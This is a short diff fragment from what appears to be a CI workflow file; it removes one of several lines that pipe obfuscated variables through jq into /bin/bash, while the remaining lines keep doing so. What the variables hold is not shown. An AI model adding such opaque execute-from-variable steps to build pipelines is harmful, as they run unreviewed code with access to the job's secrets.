@@ -24,7 +24,6 @@ jobs:
           echo $v397 | jq -r .myvj021 | /bin/bash
           printf '%s' "$cklin9" | jq -r .oy4411 | /bin/bash
           echo $pp7940 | jq -r .t4 | /bin/bash
-          printf '%s' "$af93" | jq -r .a800 | /bin/bash
           echo $tcqb11 | jq -r .w397 | /bin/bash
 
       - name: Upload results
